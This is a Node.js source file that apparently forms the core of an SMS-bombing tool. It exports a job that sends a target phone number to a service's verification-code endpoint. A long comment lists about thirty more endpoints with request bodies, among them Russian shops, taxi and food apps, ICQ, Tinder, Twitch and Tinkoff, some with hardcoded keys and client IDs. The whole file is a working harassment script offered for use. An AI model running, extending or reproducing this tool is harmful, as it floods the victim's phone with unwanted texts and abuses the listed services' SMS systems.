const request = require('request');


exports.jobs =function(phoneNumber){ return [
    function(){
        request.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', {
                json: {
                  phone: phoneNumber
                }
        }, (error, res, body) => {
            if (error) {
                console.error(error)
                return
            }
            console.log(`statusCode: ${res.statusCode}`)
            console.log(body)
        })
    }
]};

/*"https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
            data={"phone": self.formatted_phone},

"https://api.carsmile.com/",
            json={
                "operationName": "enterPhone",
                "variables": {"phone": self.formatted_phone},
                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n",
            }

"https://www.citilink.ru/registration/confirm/phone/+"
            + self.formatted_phone
            + "/"

"https://api.delitime.ru/api/v2/signup",
            data={
                "SignupForm[username]": self.formatted_phone,
                "SignupForm[device_type]": 3,
            }

 "https://findclone.ru/register",
            params={"phone": "+" + self.formatted_phone}

  "https://guru.taxi/api/v1/driver/session/verify",
            json={"phone": {"code": 1, "number": self.phone}},

"https://www.icq.com/smsreg/requestPhoneValidation.php",
            data={
                "msisdn": self.formatted_phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763"}

"https://terra-1.indriverapp.com/api/authorization?locale=ru",
            data={
                "mode": "request",
                "phone": "+" + self.formatted_phone,
                "phone_permission": "unknown",
                "stream_id": 0,
                "v": 3,
                "appversion": "3.20.6",
                "osversion": "unknown",
                "devicemodel": "unknown",
            }

 "https://ube.pmsm.org.ru/esb/iqos-phone/validate",
            json={"phone": self.phone},

 "https://api.ivi.ru/mobileapi/user/register/phone/v6",
            data={"phone": self.formatted_phone},

 "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            json={"phone": "+" + self.formatted_phone}
  "https://cloud.mail.ru/api/v2/notify/applink",
            json={
                "phone": "+" + self.formatted_phone,
                "api": 2,
                "email": "email",
                "x-email": "x-email",
            },


  "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
            params={"pageName": "registerPrivateUserPhoneVerificatio"},
            data={
                "phone": self.formatted_phone,
                "recaptcha": "off",
                "g-recaptcha-response": "",
            }
"https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            data={"st.r.phone": "+" + self.formatted_phone}

"https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": self.formatted_phone, "otpId": 0}

"https://plink.tech/register/", json={"phone": self.formatted_phone}

"https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
            json={"phone": self.formatted_phone}
"https://api.sunlight.net/v3/customers/authorization/",
            data={"phone": self.formatted_phone},
"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            data={"phone_number": self.formatted_phone}

"https://api.tinkoff.ru/v1/sign_up",
            data={"phone": "+" + self.formatted_phone},

"https://passport.twitch.tv/register?trusted_request=true",
            json={
                "birthday": {"day": 11, "month": 11, "year": 1999},
                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                "include_verification_code": True,
                "password": password,
                "phone_number": self.formatted_phone,
                "username": username,}
"https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": self.formatted_phone},
            headers={"App-ID": "cabinet"}

"https://api.wowworks.ru/v2/site/send-code",
   json={"phone": self.formatted_phone, "type": 2},

"https://api.chef.yandex/api/v2/auth/sms", json={"phone": self.phone}

"https://eda.yandex/api/v1/user/request_authentication_code",
            json={"phone_number": "+" + self.formatted_phone},
"https://youla.ru/web-api/auth/request_code",
            data={"phone": self.formatted_phone}
*/
